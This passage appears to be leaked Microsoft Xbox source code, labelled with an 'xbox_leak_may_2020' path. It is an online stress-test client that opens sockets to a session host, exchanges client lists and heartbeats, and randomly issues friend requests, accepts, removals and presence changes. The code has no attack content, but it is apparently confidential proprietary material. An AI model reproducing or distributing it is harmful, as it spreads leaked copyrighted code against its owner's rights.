	//NOTE: rgchBuffer can contain \0 values
	HRESULT SetResponse(const char* rgchBuffer, DWORD dwcBuffer);
	//set response from a file
	HRESULT SetResponse(const char* pszFilename);
	//listen for incoming request and send response after first \r\n
	HRESULT Listen();
	//stop listen
	HRESULT Stop();

private:
	//response buffer
	char m_rgchResponse[MAX_RESPONSE_BUFFER];
	//buffer response size
	DWORD m_dwcResponse;
	//protection for response buffer
	CRITICAL_SECTION m_cs;
	//stop listening event
	HANDLE m_shutdown;
	//singleton
	bool m_fListening;
	//network initialized
	bool m_fNetInit;

private:
	//process an incoming socket
	HRESULT ProcessClient(SOCKET* ps);

};//endclass
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\client.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       client.cpp
 *  Content:    Code for the client algorithm of the integrated online stress test
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  01/08/01    tristanj Created to hold all code related to the client stress algorithm
 *
 ****************************************************************************/

#include "onlinestress.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;
extern CLogonTask *g_pLogonTask;
extern BOOL g_fExitTest;

static DWORD g_dwMinuteCounter = 0;
static DWORD g_dwFriendRequestCount = 0;
static DWORD g_dwFriendAcceptCount = 0;
static DWORD g_dwFriendRejectCount = 0;
static DWORD g_dwFriendRemoveCount = 0;
static DWORD g_dwPresenceStateChangeCount = 0;
static DWORD g_dwFriendListChangeCount = 0;
static DWORD g_dwFriendGameInviteCount = 0;
static DWORD g_dwFriendGameInviteRevokeCount = 0;
static DWORD g_dwFriendGameInviteAcceptCount = 0;
static DWORD g_dwFriendGameInviteRejectCount = 0;
static DWORD g_dwMatchSearchCount = 0;
static ULONGLONG g_qwBytesReceived = 0;
static ULONGLONG g_qwBytesSent = 0;

/****************************************************************************
 *
 *  CreateClientConnectionToHost
 *
 *  Description:
 *      Creates a connection to the host and sends the local user information
 *
 *  Arguments:
 *      CClientConnection     *pClientConnection  Pointer to a client connection that is to be filled
 *                                                connection information with the host
 *      XNADDR                *pHostAddr          Address of the host
 *      XNKID                 *pSessionID         XNKID to register with the network stack
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if the socket timed out waiting to connect
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT CreateClientConnectionToHost(CClientConnection *pClientConnection, XNADDR *pHostAddr, XNKID *pSessionID)
{
	COnlineTimer ConnectionTimer;
	SOCKADDR_IN HostAddress;
	HRESULT hr = S_OK;
	SOCKET HostSocket = INVALID_SOCKET;
    fd_set writefds, exceptfds;
	TIMEVAL sTimeout = {0, 0}; 
    ULONG uNonBlockParam = TRUE;
	INT nActiveSockets = 0;

	HostAddress.sin_family = AF_INET;
	HostAddress.sin_port = htons(XONSTRESS_HOST_PORT);

	//
	// Get a dummy IP address binding for the host's address
	//
	if(XNetXnAddrToInAddr(pHostAddr, pSessionID, &(HostAddress.sin_addr)))
	{
		LOGTASKINFO(g_hLog, "Error getting a private INADDR from host's XNADDR");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Create the socket to communicate with the host
	//
	HostSocket = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
	if(HostSocket == INVALID_SOCKET)
	{
		LOGTASKINFO(g_hLog, "Error creating socket");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Set non-blocking IO
	//
	if(SOCKET_ERROR == ioctlsocket(HostSocket, FIONBIO, &uNonBlockParam))
	{
		LOGTASKINFO(g_hLog, "Error setting client socket to use non-blocking IO");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Connect to the host socket
	//
	if(connect(HostSocket, (const struct sockaddr *) &HostAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		if(WSAGetLastError() != WSAEWOULDBLOCK)
		{
			LOGTASKINFO(g_hLog, "Error connecting to host");
			hr = E_FAIL;
			goto Exit;
		}
	}

	//
	// Wait until socket finishes connecting
	//

	ConnectionTimer.SetAllowedTime(XONSTRESS_MAX_CONNECT_TIME);
	ConnectionTimer.Start();

	do
	{
		FD_ZERO(&writefds);
		FD_ZERO(&exceptfds);
		FD_SET(HostSocket, &writefds);
		FD_SET(HostSocket, &exceptfds);

		nActiveSockets = select(0, NULL, &writefds, &exceptfds, &sTimeout);

		if(FAILED(WaitAndPump(0, g_pLogonTask)))
		{
			LOGTASKINFO(g_hLog, "Error pumping logon handle");
			hr = E_FAIL;
			goto Exit;
		}

		Sleep(0);

	} while((nActiveSockets <= 0) && (!ConnectionTimer.HasTimeExpired()));

    if(nActiveSockets <= 0)
    {
        hr = S_FALSE;
        goto Exit;
    }
                
    if(FD_ISSET(HostSocket, &exceptfds))
    {
        hr = E_FAIL;
        goto Exit;
    }

    if(!FD_ISSET(HostSocket, &writefds))
    {
        hr = S_FALSE;
        goto Exit;
    }

	hr = S_OK;

	pClientConnection->SetSocket(HostSocket);

Exit:

	if(hr == E_FAIL)
	{
		closesocket(HostSocket);
		HostSocket = INVALID_SOCKET;
	}

	return hr;
}

/****************************************************************************
 *
 *  SendClientInfoToServer
 *
 *  Description:
 *      Creates a connection to the host and sends the local user information
 *
 *  Arguments:
 *      CClientConnection     *pClientConnection  Pointer to a client connection that will be
 *                                                used to send info to the server
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if the socket timed out waiting to connect
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT SendClientInfoToServer(CClientConnection *pClientConnection)
{
	COnlineTimer SendTimer;
	CSessionUser *pUser = NULL;
	PXONLINE_USER pLogonUsers = NULL, pCurrentUser = NULL;
	HRESULT hr = S_OK;
	DWORD dwClientBuffSize = 0;
	CHAR *pClientBuff = NULL;
	INT n = 0;

	//
	// Get the local address of the client
	//
	if(!(XNetGetTitleXnAddr(&(pClientConnection->m_ClientAddr)) & XNET_GET_XNADDR_ONLINE))
	{
		LOGTASKINFO(g_hLog, "Error retrieving title XNADDR");
        hr = E_FAIL;
        goto Exit;
	}

	//
	// Get information about all currently logged on users
	//
	if(!(pLogonUsers = XOnlineGetLogonUsers()))
	{
		LOGTASKINFO(g_hLog, "Error retrieving locally logged on users");
        hr = E_FAIL;
        goto Exit;
	}

	//
	// Add user information to the client connection object
	//
	for(n = 0, pCurrentUser = pLogonUsers;n < XONLINE_MAX_LOGON_USERS; ++n,++pCurrentUser)
	{
		if(!(pUser = new CSessionUser))
		{
			LOGTASKINFO(g_hLog, "Not enough memory to allocate session user");
			hr = E_FAIL;
			goto Exit;
		}
		pUser->SetUserInfo(&(pCurrentUser->xuid), pCurrentUser->name, pCurrentUser->kingdom);
		pClientConnection->AddUser(*pUser);
		delete pUser;
		pUser = NULL;
	}

	//
	// Retrieve the required client buffer size
	//
	if(FAILED(pClientConnection->PackIntoBuffer(NULL, &dwClientBuffSize)))
	{
		LOGTASKINFO(g_hLog, "Error retrieving required client buffer size");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Allocate the client buffer
	//
	if(!(pClientBuff = new CHAR[dwClientBuffSize]))
	{
		LOGTASKINFO(g_hLog, "Not enough memory to allocate client buffer");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Pack the client information into the buffer
	//
	if(pClientConnection->PackIntoBuffer(pClientBuff, &dwClientBuffSize) != S_OK)
	{
		LOGTASKINFO(g_hLog, "Error packing client information into buffer");
		hr = E_FAIL;
		goto Exit;
	}

	SendTimer.SetAllowedTime(XONSTRESS_CLIENT_SEND_TIME);

	TRACE(g_hLog, "Sending client info to host");

	//
	// Send the client information.  This should never timeout, so fail in that case
	//
	if(SendPacket(pClientConnection->GetSocket(), pClientBuff, (INT) dwClientBuffSize, &SendTimer) != S_OK)
	{
		LOGTASKINFO(g_hLog, "Timed out on first send!");
		hr = E_FAIL;
		goto Exit;
	}

Exit:

	if(pUser)
	{
		delete pUser;
		pUser = NULL;
	}

	return hr;
}

/****************************************************************************
 *
 *  RemoveClientFromVector
 *
 *  Description:
 *      Scans through the client vector for the specified client and removes it
 *      (A client is considered equal to the specified client if it has the same XNADDR)
 *
 *  Arguments:
 *      CClientConnection      *pClientConnection Pointer to a client connection to be removed
 *      XONSTRESS_CLIENTVECTOR *pClientVector     Pointer to the vector of clients connected
 *                                                to this session
 *
 *  Returns:  
 *      (none)
 *
 ****************************************************************************/
void RemoveClientFromVector(CClientConnection *pNewClient, XONSTRESS_CLIENTVECTOR *pClientVector)
{
	XONSTRESS_CLIENTVECTOR::iterator CurrentClient, ClientEnd;

	// If pNewClient is present in the client vector, remove it
	for(CurrentClient = pClientVector->begin(), ClientEnd = pClientVector->end(); CurrentClient != ClientEnd; ++CurrentClient)
	{
		if(*CurrentClient == *pNewClient)
		{
			pClientVector->erase(CurrentClient);
			return;
		}
	}

	return;
}

/****************************************************************************
 *
 *  ProcessNewInfoFromHost
 *
 *  Description:
 *      Processes new list information from the host and adds it to the client vector
 *
 *  Arguments:
 *      CClientConnection      *pClientConnection Pointer to a client connection that will be
 *                                                receiving data from the host
 *      XONSTRESS_CLIENTVECTOR *pClientVector     Pointer to the vector of clients connected
 *                                                to this session
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if the socket timed out waiting to received data
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT ProcessNewInfoFromHost(CClientConnection *pClientConnection, XONSTRESS_CLIENTVECTOR *pClientVector)
{
	COnlineTimer ReadTimer;
    fd_set readfds, exceptfds;
	TIMEVAL sTimeout = {0, 0}; 
	INT nActiveSockets = 0;
	HRESULT hr = S_OK;
	XONSTRESS_CLIENTLIST_HEADER ClientListHeader;
	DWORD dwCurrentOffset = 0, dwCurrentClient = 0, dwLastClientSize = 0;
	CHAR *pClientListBuffer = NULL;
	CClientConnection *pNewClient = NULL;
	ULONG uBytesAvailable = 0;

	ReadTimer.SetAllowedTime(XONSTRESS_CLIENT_RECV_TIME);

	//
	// Poll the socket to see if there is any pending data to read
	//
    FD_ZERO(&readfds);
    FD_ZERO(&exceptfds);
    FD_SET(pClientConnection->GetSocket(), &readfds);
    FD_SET(pClientConnection->GetSocket(), &exceptfds);

	nActiveSockets = select(0, &readfds, NULL, &exceptfds, &sTimeout);

	if(FAILED(WaitAndPump(0, g_pLogonTask)))
	{
		LOGTASKINFO(g_hLog, "Error pumping logon handle");
		hr = E_FAIL;
		goto Exit;
	}

    if(nActiveSockets <= 0)
    {
        hr = S_FALSE;
        goto Exit;
    }

    if(FD_ISSET(pClientConnection->GetSocket(), &exceptfds))
    {
        hr = E_FAIL;
        goto Exit;
    }

    if(!FD_ISSET(pClientConnection->GetSocket(), &readfds))
    {
        hr = S_FALSE;
        goto Exit;
    }

	if(SOCKET_ERROR == ioctlsocket(pClientConnection->GetSocket(), FIONREAD, &uBytesAvailable))
	{
		TRACE(g_hLog, "Error determining number of bytes pending on socket");
        hr = E_FAIL;
        goto Exit;
	}

//	TRACE(g_hLog, "%u bytes pending on host socket", uBytesAvailable);

	//
	// Read pending data from the socket
	//

	memset(&ClientListHeader, 0, sizeof(ClientListHeader));
	hr = ReadPacket(pClientConnection->GetSocket(), (CHAR *) &(ClientListHeader.dwClientListSize), sizeof(DWORD), &ReadTimer);
	if(FAILED(hr))
	{
		LOGTASKINFO(g_hLog, "A socket error occured, disconnecting");
		pClientConnection->SetAsDisconnected();
		goto Exit;
	}
	else if(hr == S_FALSE)
	{
		TRACE(g_hLog, "Timed out reading info from host");
		goto Exit;
	}

	// Update the last received heartbeat time
	pClientConnection->ResetIncomingHeartbeatTimer();

	// If the pending data is a heartbeat, exit
	if(ClientListHeader.dwClientListSize == sizeof(DWORD))
	{
//		TRACE(g_hLog, "Received heartbeat from host");
		goto Exit;
	}

//	TRACE(g_hLog, "Receiving %u bytes of list data from host", ClientListHeader.dwClientListSize);

	// If the pending data is too small, then exit
	if(ClientListHeader.dwClientListSize <= sizeof(XONSTRESS_CLIENTLIST_HEADER))
	{
		LOGTASKINFO(g_hLog, "Bad client list received");
		goto Exit;
	}

	// Read the remaining data 
	hr = ReadPacket(pClientConnection->GetSocket(), (CHAR *) &(ClientListHeader.dwClientCount), sizeof(DWORD), &ReadTimer);
	if(FAILED(hr))
	{
		LOGTASKINFO(g_hLog, "A socket error occured, disconnecting");
		pClientConnection->SetAsDisconnected();
		goto Exit;
	}
	else if(hr == S_FALSE)
	{
		TRACE(g_hLog, "Timed out reading info from host");
		goto Exit;
	}

	// If there are no clients in the list, then exit
	if(!ClientListHeader.dwClientCount)
	{
		TRACE(g_hLog, "Received empty list from host");
		goto Exit;
	}

	ClientListHeader.dwClientListSize -= sizeof(XONSTRESS_CLIENTLIST_HEADER);

	for(dwCurrentOffset = 0, dwCurrentClient = 0, dwLastClientSize = 0;
	(dwCurrentOffset < ClientListHeader.dwClientListSize) && (dwCurrentClient < ClientListHeader.dwClientCount);
	dwCurrentOffset += dwLastClientSize, ++dwCurrentClient)
	{
//		TRACE(g_hLog, "Reading client %u from host", dwCurrentClient + 1);

		// Read the client header
		hr = ReadPacket(pClientConnection->GetSocket(), (CHAR *) &dwLastClientSize, sizeof(DWORD), &ReadTimer);
		if(FAILED(hr))
		{
			LOGTASKINFO(g_hLog, "A socket error occured, disconnecting");
			pClientConnection->SetAsDisconnected();
			goto Exit;
		}
		else if(hr == S_FALSE)
		{
			TRACE(g_hLog, "Timed out reading info from host");
			goto Exit;
		}

		if(dwLastClientSize < sizeof(XONSTRESS_CLIENT_HEADER))
		{
			LOGTASKINFO(g_hLog, "Bad client info received");
			continue;
		}

		// Allocate a buffer to read the next client info
		pClientListBuffer = new CHAR[dwLastClientSize];
		memset(pClientListBuffer, 0, dwLastClientSize);
		*((DWORD *) pClientListBuffer) = dwLastClientSize;

//		TRACE(g_hLog, "Receiving %u bytes of client data from host", ClientListHeader.dwClientListSize);

		// Read the client header
		hr = ReadPacket(pClientConnection->GetSocket(), pClientListBuffer + sizeof(DWORD), dwLastClientSize - sizeof(DWORD), &ReadTimer);
		if(FAILED(hr))
		{
			LOGTASKINFO(g_hLog, "A socket error occured, disconnecting");
			pClientConnection->SetAsDisconnected();
			goto Exit;
		}
		else if(hr == S_FALSE)
		{
			TRACE(g_hLog, "Timed out reading info from host");
			goto Exit;
		}

		// Unpack the client info from the buffer into a new client object
		pNewClient = new CClientConnection;
		hr = pNewClient->UnpackFromBuffer(pClientListBuffer, &dwLastClientSize);
		if(FAILED(hr))
		{
			LOGTASKINFO(g_hLog, "Error unpacking client from buffer");
			goto Exit;
		}

		// If this is a client disconnect, then remove this client from the master client list
		if(pNewClient->IsDisconnected())
		{
			TRACE(g_hLog, "Marking client at %02X%2X%02X%02X%02X%02X as disconnected", 
				pNewClient->m_ClientAddr.abEnet[0],
				pNewClient->m_ClientAddr.abEnet[1],
				pNewClient->m_ClientAddr.abEnet[2],
				pNewClient->m_ClientAddr.abEnet[3],
				pNewClient->m_ClientAddr.abEnet[4],
				pNewClient->m_ClientAddr.abEnet[5]);
			RemoveClientFromVector(pNewClient, pClientVector);
		}
		// Otherwise, add the new client to the master client list
		else
		{
			TRACE(g_hLog, "Adding new client at %02X%2X%02X%02X%02X%02X", 
				pNewClient->m_ClientAddr.abEnet[0],
				pNewClient->m_ClientAddr.abEnet[1],
				pNewClient->m_ClientAddr.abEnet[2],
				pNewClient->m_ClientAddr.abEnet[3],
				pNewClient->m_ClientAddr.abEnet[4],
				pNewClient->m_ClientAddr.abEnet[5]);
			pClientVector->push_back(*pNewClient);
		}

		delete pNewClient;
		pNewClient = NULL;

		delete [] pClientListBuffer;
		pClientListBuffer = NULL;
	}


Exit:

	// If we didn't receive any data from the server, and the timeout has expired, then fail
	if(hr == S_FALSE)
	{
		if(pClientConnection->IsIncomingHearbeatExpired())
		{
			LOGTASKINFO(g_hLog, "Timed out waiting for server");
			hr = E_FAIL;
		}
	}

	if(pNewClient)
	{
		delete pNewClient;
		pNewClient = NULL;
	}

	if(pClientListBuffer)
	{
		delete [] pClientListBuffer;
		pClientListBuffer = NULL;
	}

	return hr;
}

/****************************************************************************
 *
 *  SendClientHeartbeat
 *
 *  Description:
 *      Sends a heartbeat message to the session host if the timeout has expired
 *
 *  Arguments:
 *      CClientConnection      *pClientConnection  Client connection to send a heartbeat on
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT SendClientHeartbeat(CClientConnection *pClientConnection)
{
	HRESULT hr = S_OK;
	DWORD dwOutgoingHeartbeat = sizeof(DWORD);

	if(pClientConnection->IsOutgoingHeartbeatExpired())
	{
		// Don't worry about if the send fails, since the lack of heartbeat will cause this client
		// to be removed eventually anyway
//		TRACE(g_hLog, "Sending heartbeat to host");

		if((hr = SendPacket(pClientConnection->GetSocket(), (CHAR *) &dwOutgoingHeartbeat, sizeof(DWORD), NULL)) != S_OK)
		{
			TRACE(g_hLog, "Send failed with 0x%08x", hr);
			hr = S_OK;
		}
		pClientConnection->ResetOutgoingHeartbeatTimer();
	}

	return hr;
}

/****************************************************************************
 *
 *  PickUserToInvite
 *
 *  Description:
 *      Pick a random user from the client list and return their XUID for invitation
 *
 *  Arguments:
 *      XONSTRESS_CLIENTVECTOR  *pClientVector     Vector containing info on all clients and users connected
 *                                                 to this session
 *      XUID                    *pTargetUserXUID   Pointer to return the target user XUID
 *      CHAR                    *szTargetUserName  Pointer to return the target user name
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
BOOL PickUserToInvite(XONSTRESS_CLIENTVECTOR *pClientVector, XUID *pTargetUserXUID, CHAR *szTargetUserName)
{
	DWORD dwNumClients = pClientVector->size();
	DWORD dwTargetClientIndex = 0, dwTargetUserIndex = (rand() % XONLINE_MAX_LOGON_USERS);

	if(!dwNumClients)
		return FALSE;

	dwTargetClientIndex = (rand() % dwNumClients);

	return ((*pClientVector)[dwTargetClientIndex]).GetRandomUserInfo(pTargetUserXUID, szTargetUserName);
}

/****************************************************************************
 *
 *  PickFriendToAcceptReject
 *
 *  Description:
 *      Pick the first pending friend from the client list and return their XONLINE_FRIEND info for accept/reject
 *
 *  Arguments:
 *      CFriendEnumTask         *pFriendEnumTask   Enumeration task for this user (lets us get at their friends list)
 *      XONLINE_FRIEND          *pTargetFriend     Pointer for handing back the friend to accept/reject
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
BOOL PickFriendToAcceptReject(CFriendEnumTask *pFriendEnumTask, XONLINE_FRIEND *pTargetFriend)
{
	XONLINE_FRIEND *pFriendsList = NULL;
	DWORD dwFriendCount = 0, dwFriendIndex = 0;

	dwFriendCount = pFriendEnumTask->GetLatestFriendList(&pFriendsList);

	for(dwFriendIndex = 0; dwFriendIndex < dwFriendCount; ++dwFriendIndex)
	{
		// If the request flag is set, then we need to either accept or reject
		if(pFriendsList[dwFriendIndex].friendState & XONLINE_FRIENDSTATE_FLAG_REQUEST)
		{
			if(pTargetFriend)
				memcpy(pTargetFriend, pFriendsList + dwFriendIndex, sizeof(XONLINE_FRIEND));

			return TRUE;
		}
	}

	return FALSE;
}

/****************************************************************************
 *
 *  PickInvitingFriendForAction
 *
 *  Description:
 *      Pick the first friend that has invited us to a game session and return their XONLINE_FRIEND info
 *
 *  Arguments:
 *      CFriendEnumTask         *pFriendEnumTask   Enumeration task for this user (lets us get at their friends list)
 *      XONLINE_FRIEND          *pTargetFriend     Pointer for handing back the friend that has invited us to a game
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT PickInvitingFriendForAction(CFriendEnumTask *pFriendEnumTask, XONLINE_FRIEND *pTargetFriend)
{
	XONLINE_FRIEND *pFriendsList = NULL;
	DWORD dwFriendCount = 0, dwFriendIndex = 0;

	dwFriendCount = pFriendEnumTask->GetLatestFriendList(&pFriendsList);

	for(dwFriendIndex = 0; dwFriendIndex < dwFriendCount; ++dwFriendIndex)
	{
		// If the received invite flag is set, then this friend has invited us
		if(pFriendsList[dwFriendIndex].friendState & XONLINE_FRIENDSTATE_FLAG_RECEIVEDINVITE)
		{
			if(pTargetFriend)
				memcpy(pTargetFriend, pFriendsList + dwFriendIndex, sizeof(XONLINE_FRIEND));

			return TRUE;
		}
	}

	return FALSE;
}

/****************************************************************************
 *
 *  PickInvitedFriendForAction
 *
 *  Description:
 *      Pick the first friend that we have invited to a game session and return their XONLINE_FRIEND info
 *
 *  Arguments:
 *      CFriendEnumTask         *pFriendEnumTask   Enumeration task for this user (lets us get at their friends list)
 *      XONLINE_FRIEND          *pTargetFriend     Pointer for handing back the friend that we have invited to a game
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT PickInvitedFriendForAction(CFriendEnumTask *pFriendEnumTask, XONLINE_FRIEND *pTargetFriend)
{
	XONLINE_FRIEND *pFriendsList = NULL;
	DWORD dwFriendCount = 0, dwFriendIndex = 0;

	dwFriendCount = pFriendEnumTask->GetLatestFriendList(&pFriendsList);

	for(dwFriendIndex = 0; dwFriendIndex < dwFriendCount; ++dwFriendIndex)
	{
		// If the received invite flag is set, then this friend has invited us
		if(pFriendsList[dwFriendIndex].friendState & XONLINE_FRIENDSTATE_FLAG_SENTINVITE)
		{
			if(pTargetFriend)
				memcpy(pTargetFriend, pFriendsList + dwFriendIndex, sizeof(XONLINE_FRIEND));

			return TRUE;
		}
	}

	return FALSE;
}


/****************************************************************************
 *
 *  PickFriendForAction
 *
 *  Description:
 *      Pick the first friend from the client list and return their XONLINE_FRIEND info for some invitation action
 *
 *  Arguments:
 *      CFriendEnumTask         *pFriendEnumTask   Enumeration task for this user (lets us get at their friends list)
 *      XONLINE_FRIEND          *pTargetFriend     Pointer for handing back the friend to remove
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
BOOL PickFriendForAction(CFriendEnumTask *pFriendEnumTask, XONLINE_FRIEND *pTargetFriend)
{
	XONLINE_FRIEND *pFriendsList = NULL;
	DWORD dwFriendCount = 0, dwFriendIndex = 0;

	dwFriendCount = pFriendEnumTask->GetLatestFriendList(&pFriendsList);

	for(dwFriendIndex = 0; dwFriendIndex < dwFriendCount; ++dwFriendIndex)
	{
		// If the request and pending flags aren't set, then we can remove this friend
		if(!(pFriendsList[dwFriendIndex].friendState & (XONLINE_FRIENDSTATE_FLAG_REQUEST | XONLINE_FRIENDSTATE_FLAG_PENDING)))
		{
			if(pTargetFriend)
				memcpy(pTargetFriend, pFriendsList + dwFriendIndex, sizeof(XONLINE_FRIEND));

			return TRUE;
		}
	}

	return FALSE;
}

/****************************************************************************
 *
 *  PickFriendForRemoval
 *
 *  Description:
 *      Pick the first friend from the client list and return their XONLINE_FRIEND info for removal 
 *
 *  Arguments:
 *      CFriendEnumTask         *pFriendEnumTask   Enumeration task for this user (lets us get at their friends list)
 *      XONLINE_FRIEND          *pTargetFriend     Pointer for handing back the friend to remove
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
BOOL PickFriendForRemoval(CFriendEnumTask *pFriendEnumTask, XONLINE_FRIEND *pTargetFriend)
{
	XONLINE_FRIEND *pFriendsList = NULL;
	DWORD dwFriendCount = 0, dwFriendIndex = 0;

	dwFriendCount = pFriendEnumTask->GetLatestFriendList(&pFriendsList);

	for(dwFriendIndex = 0; dwFriendIndex < dwFriendCount; ++dwFriendIndex)
	{
		// If the request flag isn't set, then we can remove this friend
		if(!(pFriendsList[dwFriendIndex].friendState & XONLINE_FRIENDSTATE_FLAG_REQUEST))
		{
			if(pTargetFriend)
				memcpy(pTargetFriend, pFriendsList + dwFriendIndex, sizeof(XONLINE_FRIEND));

			return TRUE;
		}
	}

	return FALSE;
}

/****************************************************************************
 *
 *  FriendListChange
 *
 *  Description:
 *      Make a change to the friends list
 *
 *  Arguments:
 *      CFriendOpTask           *pFriendOpTask     Pointer to a friend operation task that will be
 *                                                 used to issue friend list requests
 *      CFriendEnumTask         *pFriendEnumArray  Array of friend enumeration tasks.  Used to access
 *                                                 users friends for accepting, rejecting and removing them
 *      XONNSTRESS_CLIENTVECTOR *pClientVector     Pointer to the list of clients and users in the session
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT FriendListChange(CFriendOpTask *pFriendOpTask, CFriendEnumTask *pFriendEnumArray, XONSTRESS_CLIENTVECTOR *pClientVector)
{
	HRESULT hr = S_OK;
	DWORD dwUserDieRoll = (rand() % XONLINE_MAX_LOGON_USERS), dwActionDieRoll = (rand() & 100);
	PXONLINE_USER pCurrentUser = NULL;
	XONLINE_FRIEND TargetFriend;
	XUID TargetXUID;
	CHAR szTargetName[XONLINE_NAME_SIZE];

	pCurrentUser = XOnlineGetLogonUsers();
	pCurrentUser += dwUserDieRoll;

	// If this user doesn't have any friends, then invite someone
	if(pFriendEnumArray[dwUserDieRoll].GetLatestFriendList(NULL) == 0)
	{
		if(!PickUserToInvite(pClientVector, &TargetXUID, szTargetName))
		{
			// This is OK, because we might not have gotten any client info yet
			TRACE(g_hLog, "Failed to pick a user to send a friend invite");
			goto Exit;
		}

		// We can't invite ourselves
		if(pCurrentUser->xuid.qwUserID == TargetXUID.qwUserID)
		{
			goto Exit;
		}

		if(!pFriendOpTask->RequestFriend(dwUserDieRoll, TargetXUID))
		{
			TRACE(g_hLog, "Failed to issue friend request");
			hr = E_FAIL;
			goto Exit;
		}

		++g_dwFriendRequestCount;

//		TRACE(g_hLog, "Issuing friend request to %S", szTargetName);
	}
	// If there are pending invites, then there should be a relatively high priority of handling
	else if(PickFriendToAcceptReject(pFriendEnumArray + dwUserDieRoll, &TargetFriend))
	{		
		// 80% chance we'll accept (this will get friend lists larger)
		if(dwActionDieRoll < 80)
		{
			if(!pFriendOpTask->AnswerFriendRequest(dwUserDieRoll, &TargetFriend, XONLINE_REQUEST_YES))
			{
				TRACE(g_hLog, "Failed to accept friend request");
				hr = E_FAIL;
				goto Exit;
			}
			
			++g_dwFriendAcceptCount;

//			TRACE(g_hLog, "Accepting friend invite from %S", TargetFriend.username);
		}
		// 20% chance we'll reject
		else
		{
			if(!pFriendOpTask->AnswerFriendRequest(dwUserDieRoll, &TargetFriend, XONLINE_REQUEST_NO))
			{
				TRACE(g_hLog, "Failed to accept friend request");
				hr = E_FAIL;
				goto Exit;
			}
			
			++g_dwFriendRejectCount;

//			TRACE(g_hLog, "Rejecting friend invite from %S", TargetFriend.username);
		}
		
	}
	// If this user has the maximum number of friends, then remove one
	else if(pFriendEnumArray[dwUserDieRoll].GetLatestFriendList(NULL) == MAX_FRIENDS)
	{
		if(!PickFriendForRemoval(pFriendEnumArray + dwUserDieRoll, &TargetFriend))
		{
			TRACE(g_hLog, "Failed to pick a user to remove");
			hr = E_FAIL;
			goto Exit;
		}
		
		if(!pFriendOpTask->RemoveFriend(dwUserDieRoll, &TargetFriend))
		{
			TRACE(g_hLog, "Failed to remove friend");
			hr = E_FAIL;
			goto Exit;
		}
		
		++g_dwFriendRemoveCount;

//		TRACE(g_hLog, "Removing %S from friends list", TargetFriend.username);
	}
	// Otherwise, we've got friends, but there are no pending requests
	// We'll have to either remove someone or invite someone new
	else
	{
		// 80% chance we'll invite another user (this will get friend lists larger)
		if(dwActionDieRoll < 80)
		{
			if(!PickUserToInvite(pClientVector, &TargetXUID, szTargetName))
			{
				// This is OK, because we might not have gotten any client info yet
				TRACE(g_hLog, "Failed to pick a user to send a friend invite");
				goto Exit;
			}
		
			// We can't invite ourselves
			if(pCurrentUser->xuid.qwUserID == TargetXUID.qwUserID)
			{
				goto Exit;
			}

			if(!pFriendOpTask->RequestFriend(dwUserDieRoll, TargetXUID))
			{
				TRACE(g_hLog, "Failed to issue friend request");
				hr = E_FAIL;
				goto Exit;
			}
			
			++g_dwFriendRequestCount;

//			TRACE(g_hLog, "Issuing friend request to %S", szTargetName);
		}
		// 20% chance we'll remove a user
		else
		{
			if(!PickFriendForRemoval(pFriendEnumArray + dwUserDieRoll, &TargetFriend))
			{
				TRACE(g_hLog, "Failed to pick a user to remove");
				hr = E_FAIL;
				goto Exit;
			}
			
			if(!pFriendOpTask->RemoveFriend(dwUserDieRoll, &TargetFriend))
			{
				TRACE(g_hLog, "Failed to remove friend");
				hr = E_FAIL;
				goto Exit;
			}
			
			++g_dwFriendRemoveCount;

//			TRACE(g_hLog, "Removing %S from friends list", TargetFriend.username);
		}
	}

Exit:

	return hr;
}

/****************************************************************************
 *
 *  PresenceStatusChange
 *
 *  Description:
 *      Changes the presence status for a random user
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT PresenceStatusChange(XNKID *pCurrentSession)
{
	HRESULT hr = S_OK;
	DWORD dwUserDieRoll = (rand() % XONLINE_MAX_LOGON_USERS);
	DWORD dwRandomStateFlags = rand() & 0x000000FF, cbData = 0;
	BYTE bDataIndex = 0;
	BYTE *pData = NULL;

	cbData = (rand() % MAX_STATEDATA_SIZE);
	
	if(cbData)
	{
		pData = new BYTE[cbData];
		if(!pData)
		{
			TRACE(g_hLog, "Couldn't allocate state data");
			hr = E_FAIL;
			goto Exit;
		}
		// Fill the state buffer with random data
		for(bDataIndex = 0;bDataIndex < cbData;++bDataIndex)
		{
			pData[bDataIndex] = (BYTE) (rand() & 0x000000FF);
		}
	}
	
	// Make sure the state flags use valid values
	dwRandomStateFlags &= (XONLINE_FRIENDSTATE_FLAG_ONLINE
		| XONLINE_FRIENDSTATE_FLAG_PLAYING
		| XONLINE_FRIENDSTATE_FLAG_CLOAKED
		| XONLINE_FRIENDSTATE_FLAG_VOICE
